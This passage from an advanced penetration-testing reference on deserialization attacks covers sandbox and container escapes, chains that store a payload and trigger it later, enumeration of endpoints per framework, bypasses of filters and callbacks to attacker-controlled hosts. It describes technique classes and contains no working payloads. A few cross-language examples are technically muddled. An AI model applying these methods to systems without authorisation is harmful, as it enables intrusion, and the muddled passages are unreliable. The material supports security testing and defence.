**AMF3** — binary. Type marker byte followed by type-specific encoding. `0x11` is "typed object" carrying a class name; the class name is in the next varint-length string.

**JWT** — text, base64url-encoded three-part header.payload.signature. The header is `{"alg":"<algo>","typ":"JWT"}` optionally with `cty`, `kid`, `jku`, `jwk`. The `alg` field is the primary attack surface; `cty=JWT` marks nested tokens.

## Cross-Language Serialization Surfaces

Services that serialize in one language and deserialize in another expose the deserialization sink to attackers who understand the wire format. Concrete surfaces:

**Java → Python via `pyjnius`** — Python code that reads Java-serialized bytes and hands them to a JVM subprocess. The Python side does no deserialization; the Java side does. A payload that reaches the Python side (via any Python-tier endpoint) reaches the JVM.

**.NET → Java via IKVM** — IKVM.NET runs the JVM within .NET; a .NET app that internally uses JVM classes may accept Java-serialized input at the boundary. Rare but real for legacy migrations.

**Python → Java via pickled objects sent over a queue** — a Python producer pickles an object and publishes it to a queue; a Python consumer unpickles. A Java process that also consumes the queue but is not expecting Python pickle input can be steered to a Python-shell exec via the queue routing rules.

**gRPC bridges** — the gRPC service definition might use Protobuf, but internal handlers may unmarshal a `google.protobuf.Any` field with the type-URL naming a language-specific deserializer. A cross-language service mesh with a Java gateway and Python workers can carry Java-serialized bytes in a protobuf field that the Python worker deserializes via `pickle.loads`.

**Shared cache** — Redis storing serialized objects that different language services read. A Java process writing a Java-serialized blob, a Python process reading and calling `pickle.loads` on it (assuming it's pickle), fails safely; but a Python process reading and calling `deserialize()` on it with a "polymorphic" library that guesses the format fires the Java-side gadget only if a Java process reads it back.

**Format-confusion classes**: `.pyc` (Python compiled bytecode) vs `.class` (Java bytecode) — services that "load code from any file" without checking the magic bytes can be steered to run the wrong runtime. Rare but the class shape exists.

## Sandbox-Escape Chains

A deserialization primitive within a sandboxed context (JS `vm2`, Python `RestrictedPython`, Java's now-deprecated `SecurityManager`) can escape by reaching a class outside the sandbox's allow-list.

**`vm2` sandbox escape via deserialization** — even when vm2 is used to sandbox untrusted code, if the sandboxed code can send a serialized object to the host process (via a message pipe, a shared file, or an outbound-fetch), the host's deserializer runs outside the sandbox. The class shape: `vm2` fully-contained code cannot exec on the host; `vm2`-produced serialized data unmarshaled by the host does.

**Java `SecurityManager` bypass via serialization** — the `SecurityManager` (now-deprecated in JDK 17+, planned for removal) restricted `AccessController.checkPermission` on many operations, but many serialization-reachable operations bypass this. A gadget chain that reaches `Method.setAccessible(true)` and then invokes `Runtime.exec` runs even under a `SecurityManager` because the accessibility bypass is not gated by `checkPermission`.

**Python `RestrictedPython` bypass via YAML** — RestrictedPython restricts what Python code can call, but `yaml.load(user_input, Loader=UnsafeLoader)` inside RestrictedPython still runs the unsafe loader. The class shape: sandboxes gate what the sandboxed code can call, not what a downstream deserializer running in the sandbox does with the input.

**Docker sandbox escape via deserialization + host-socket exposure** — a container with the Docker socket mounted (`/var/run/docker.sock`) can, via deserialization RCE, launch privileged containers on the host and escape. This is the container-escape class shape at deserialization-primitive-plus.

## Deep Second-Order Attack-Graph Model

The second-order class deserves formal model treatment because the write and read endpoints are decoupled in time, network location, and often team ownership.

**Node types in the graph**:
- **Write nodes** — endpoints that accept attacker input and store it. Each has a schema, a validation policy, and a storage medium.
- **Storage nodes** — the storage medium (DB column, cache key, filesystem path, queue). Each has an encoding at rest.
- **Read nodes** — endpoints that read from storage and deserialize. Each has a deserializer and a trust context.
- **Trigger nodes** — the causal action that invokes a read (an admin login, a scheduled job, a cache warm, a user's next request).

**Edge types**:
- Write → Storage: the storage happens on write.
- Storage → Read: the read happens when triggered.
- Trigger → Read: the trigger invokes the read.

**Complete chain**: Attacker → Write endpoint → Storage → (Trigger delay) → Read endpoint → Deserialize sink → Exec.

**Enumeration methodology for write endpoints**:
1. **Profile-shaped fields** — display name, bio, address, custom-user-attributes, avatar-metadata. High-yield because these are rendered in admin dashboards.
2. **Content-shaped fields** — post body, comment body, message body, support ticket. Rendered in moderator/admin tools.
3. **Metadata-shaped fields** — filename, upload description, tag, category. Rendered in file browsers and admin lists.
4. **Config-shaped fields** — user preferences, integration webhook URLs, per-tenant settings. Read by scheduled jobs and admin exports.
5. **Log-injectable fields** — every header the app logs (`User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`, custom `X-` headers). Read by log-viewers and SIEM pipelines.
6. **Queue-injectable fields** — every field the app publishes to a queue. Read by workers.

**Enumeration methodology for read endpoints**:
1. **Admin dashboards** — grep the app for admin routes, then trace what data those routes render.
2. **Scheduled jobs** — grep for cron entries, systemd timers, `@Scheduled` annotations, `crontab` configs.
3. **Background workers** — Celery beat, Sidekiq scheduler, Bull queue processors, Airflow DAGs.
4. **Export tools** — CSV/PDF/report exports, especially "monthly report" or "audit log" endpoints.
5. **Cache warmers** — startup scripts that pre-populate application state.

**Trigger analysis**:
- Immediate triggers (admin loads a dashboard right after the attacker writes) require attacker knowledge of admin activity patterns.
- Scheduled triggers (nightly reports, weekly summaries) are exploitable with time patience.
- User-driven triggers (an admin logs in and sees new profile data) require the attacker's write to sit unread until an admin acts.

**Payload-decay considerations** — a second-order payload that sits in storage for days may be affected by:
- Data migrations (schema changes that alter the stored bytes).
- Backup-restore cycles.
- Cache-eviction (if in a cache with a TTL).
- Storage-layer transformations (compression, encoding normalization).

The advanced-tier finding accounts for the decay window and delivers a payload that survives realistic storage cycles.

**Concrete framework-specific write-endpoint enumeration**:

- **Rails** — `User#update`, `User#update_attributes` accept `params[:user]` mass-assignment; any strong-parameters allow-listed field is a write endpoint. Grep `permit(...)` in every controller.
- **Django** — `ModelForm.save`, `Model.objects.update(**kwargs)`, and every DRF `Serializer.save()`. Grep for `Serializer` classes and their fields; every attacker-writable field is a candidate.
- **Laravel** — `Model::update($attributes)` with fillable fields; every `protected $fillable` array in a model.
- **Spring** — `@RequestBody`-annotated controller methods; every field on the deserialized DTO is a write.
- **Express** — every `req.body.<field>` reference in a route handler is a write endpoint.
- **ASP.NET MVC** — every `[FromBody]` model binder input is a write endpoint.

**Concrete framework-specific read-endpoint enumeration**:

- **Rails** — every `find_each`, `find_in_batches`, and admin controller action; the ActiveAdmin gem generates dashboards that walk models.
- **Django** — Django Admin's `list_display` fields, custom `ModelAdmin.actions`, Django management commands (`./manage.py`).
- **Laravel** — Nova / Filament admin panels; scheduled `Console\Kernel` commands.
- **Spring** — `@Scheduled` methods, admin controllers under `/actuator/*` or custom admin paths.
- **Express** — admin routes under `/admin`, `/dashboard`; scheduled jobs via `node-cron` / `Agenda` / `Bull`.
- **ASP.NET MVC** — admin controllers, `HangFire`-scheduled jobs, `Quartz.NET` triggers.

**Cross-framework storage medium map**:
- Session store: Rails' `secret_key_base`-signed cookie, Django's `django.contrib.sessions` (default `SessionStore` uses JSON but pickle-backed variants exist), Laravel's session driver (config-selected), Spring's `HttpSession` (JSESSIONID pointing to server-side pickled state), Express `express-session` with `store: new RedisStore()`.
- Cache: Rails `Rails.cache`, Django `django.core.cache`, Laravel `Cache::store()`, Spring's `@Cacheable`, Node's `node-cache` / `lru-cache`.
- Job queue: Sidekiq / Resque (Ruby), Celery / RQ / Dramatiq (Python), Laravel Queue (PHP), Spring Batch (Java), Bull / BullMQ (Node), Hangfire / Quartz.NET (.NET).
- File storage: any user-upload path served back or processed by a downstream endpoint.
- Database columns: any `blob` / `text` / `json` / `jsonb` column that stores serialized data.

Cross-referencing the write and read endpoints against each storage medium reveals every viable second-order chain. Automate with a static-analysis pass; grep-based enumeration is the starting point but a call-graph analyzer (Semgrep, CodeQL) surfaces the chains reliably.

## Ruby and Node.js at Advanced Depth

### Ruby-specific chain surfaces

**Sidekiq / Resque job serialization** — both frameworks default to JSON in modern versions, but the `Sidekiq::Client.push` and `Resque::Job.create` APIs accept opaque payloads. A custom serializer configured for pickle-shape performance ("write once, read many with Marshal") re-introduces the Marshal sink. Grep for `Sidekiq.configure_client { |c| c.symbolize_keys = ... }` and `Resque.enqueue_to`.

**Rack::Session::Cookie** — the classical Rails cookie-store shape. With Rails 4+ the default serializer is JSON but many apps still explicitly set `config.action_dispatch.cookies_serializer = :marshal` for compatibility. A leaked `secret_key_base` plus the Marshal serializer is direct RCE via `Marshal.load` on the next request.

**ActiveJob adapters** — Rails' `ActiveJob` abstracts over Sidekiq / Resque / Delayed::Job. The `ActiveJob::Arguments.serialize` and `deserialize` methods handle argument marshalling; custom adapters can re-introduce Marshal.

**`Psych.unsafe_load`** — the Psych 4+ way to opt into unsafe YAML. Grep for it explicitly.

**Devise session serialization** — historical Devise versions serialized session data via Marshal; a session-cookie forgery reaches the sink.

### Node.js-specific chain surfaces

**`vm` and `vm2` combined with deserialization** — see the base file's cross-reference; the compound class shape is deserialization producing a JS string that reaches `vm.runInNewContext`.

**`stream-json` and streaming JSON parsers** — some streaming parsers pass typed values to a user-defined callback; if the callback dispatches on type, a `$type`-shaped injection reaches the dispatch.

**MongoDB `$where` and JavaScript-evaluable operators** — the `$where` clause historically accepted a function; some drivers still support serialized function delivery. `$function` and `$accumulator` operators (in aggregation) execute JS on the server; a malformed BSON payload reaching the server-side execution surface is RCE-equivalent.

**Puppeteer / Playwright message-passing** — headless browser controllers pass structured-clone-serialized messages between the driver and the browser process. A malicious page that manipulates the structured clone can reach into the driver process.

**Worker-threads structured clone** — Node.js worker threads' `postMessage` uses HTML5 structured-clone; some payloads (SharedArrayBuffer, Transferable ownership transfer) can cross the trust boundary in unexpected ways.

**`serialize-javascript` with `unsafe: true`** — the flag exists for legitimate reasons but greps reliably as a marker of unsafe SSR patterns.

## Advanced Testing Methodology

Beyond the base file's 10-step methodology, the advanced tier adds:

1. **Version-differential fuzzing** — the same payload against multiple known versions of the target library, observing behavior differences. A payload that works on 2.10 but fails on 2.11 confirms the fixed-version boundary is between them.
2. **Classpath-differential enumeration** — probing the target with class names from different popular framework versions and observing which produce class-load errors vs which produce silent behavior. Silent behavior on a specific class = the class is on classpath = that chain family is viable.
3. **Wire-format probing** — submitting the same payload as different wire formats and seeing which the app accepts. `application/x-java-serialized-object` vs `application/octet-stream` vs `text/plain` vs raw-header-value: any acceptance opens a delivery channel.
4. **Serialization-adjacent fuzzing** — using AFL / libFuzzer / Jazzer on the deserialization entry point to discover crashes that indicate reachability, before selecting a chain.
5. **Callback-diverse probing** — DNS, HTTP, SMTP, ICMP-shape probes (via oast.fun subdomains that resolve to attacker-controlled hosts). Different callback types survive different egress policies.
6. **Time-baseline calibration** — before firing time-based probes, capture the target's normal response-time distribution. A 5-second sleep against a target with 3-second normal jitter is unreliable; against a target with 100ms normal jitter it is definitive.

## Filter-Layer Comparison Table

The mitigation architecture across languages/frameworks:

| Ecosystem | Filter primitive | Version introduced | Bypass classes |
|-----------|------------------|--------------------|-----------------|
| Java (native) | `ObjectInputFilter` (JEP 290) | JDK 9 | Open-tail allow-list, wildcard-in-package, chain-through-allowed-collection, filter-not-installed-on-secondary-streams |
| Java (native) | `ObjectInputFilter.Config.setSerialFilterFactory` (JEP 415) | JDK 17 | Factory-returns-null, factory-returns-ALLOWED-only, factory-installed-after-first-stream |
| .NET Framework | `SerializationBinder` on `BinaryFormatter` | .NET Fx 2.0 | Permissive binder, missing binder, binder allow-list containing gadget-reachable types |
| .NET Framework | `SubTypeValidator` on Json.NET | Newtonsoft.Json 12.0 | Type-alias evasion (`L...;`), Unicode escapes in `$type`, WRAPPER_ARRAY vs PROPERTY differential |
| .NET 9+ | BinaryFormatter throws unconditionally | .NET 9 Preview 6 | Restored via out-of-band NuGet package (unsupported) |
| PHP | `unserialize($x, ['allowed_classes' => [...]])` | PHP 7.0 | Not a guarantee — upstream explicitly warns against relying on it |
| PHP | PHAR metadata auto-unserialize removed | PHP 8.0 | Explicit `Phar::getMetadata()` still fires |
| Python | `pickle.Unpickler.find_class` override | Python 2.4+ | Attacker-controlled class name still reaches non-overridden path |
| Python | PyYAML `Loader=` required | PyYAML 6.0 | `Loader=UnsafeLoader` explicitly opts in |
| Python | `torch.load(weights_only=True)` default | PyTorch 2.6 | Two 2025–2026 CVEs land RCE on the "safe" path |
| Ruby | `YAML.safe_load` default alias | Psych 4 / Ruby 3.1 | `YAML.unsafe_load` explicitly opts in |
| Ruby | No `Marshal.load` filter — absolute prohibition | N/A | Any use on untrusted input is unsafe |
| Node.js | No native serialization filter | N/A | Third-party serializers use their own conventions |

## Reproducibility and Report Structure

The advanced-tier finding is expected to survive review by a senior engineer who did not run the exploit. The report must include everything needed to reproduce and to verify without re-firing the payload. Concrete artifact requirements:

- **The exact payload bytes** — attach as a file, hex-dumped, base64-encoded, and in the delivery-format encoding (URL-encoded, JSON-escaped, etc.). All three representations, so the reader can pick the one matching their tooling.
- **The exact HTTP request** — full wire trace (method, URL, all headers including automatically-generated ones, full body). A `curl` invocation reproducing the request is the minimum artifact.
- **The exact HTTP response** — status, headers, body. If the response is large, attach in full plus a diff against a control (an unmodified request).
- **Callback proof** — OAST log entry showing the callback landed, with source IP, timestamp, User-Agent, and any query parameters. Correlate the source IP against the target's known egress ranges (whois, target's own IP allocation, or a documented CIDR).
- **Version and fingerprint identification** — the exact library and version identified. Attach the evidence — an error stack, a header, a jar-manifest disclosure, a diff-based inference.
- **Fixed-version rebuttal** — the same payload against a patched adjacent instance, fails safely. This is the "we did not accidentally match a scanner artifact or infrastructure noise" proof.
- **Confidence tier** — Confirmed / Reachable / Suspected — explicit, per the earlier catalog.
- **Chain graph** — for compound findings, the specific gadget-graph walked, with each hop's capability transferred. This is where the base file's "capability transferred at each arrow" framing pays off in the report.

A report that includes the above passes senior-engineer review without needing to re-run the payload; a report that omits any of the above will be re-requested and the finding delayed.

## Summary

Advanced deserialization exploitation is about the class-abstraction layer: the JEP 290/415 filter architecture and its bypass classes; the format-parser differentials that let a payload smuggle across parser boundaries; the second-order attack-graph model where write and read endpoints are decoupled; the WAF magic-byte evasion classes and per-product signature-evasion catalog; the four canonical generators (ysoserial 34 chains, ysoserial.net gadget-to-sink matrix, marshalsec 13 formats, phpggc 44 frameworks) with per-chain classpath preconditions and gadget-graph decomposition; the wire-format fingerprint catalog that predicts what parser will run; and the confirmation methodology when callbacks are not viable, including the side-channel catalog and the passive-only fingerprint techniques. The novel sibling owns the per-CVE version tables and the 2024–2026 published-instance frontier; this file owns the reusable technique classes that predict where the next CVE will land. The load-bearing insight for practitioners: every mitigation in the filter-layer comparison table has a specific bypass class, and every bypass class has a matching audit hook — the pen-tester's job is to walk both sides in every engagement, treating "filter enforced" as a hypothesis to falsify rather than as an end-state.
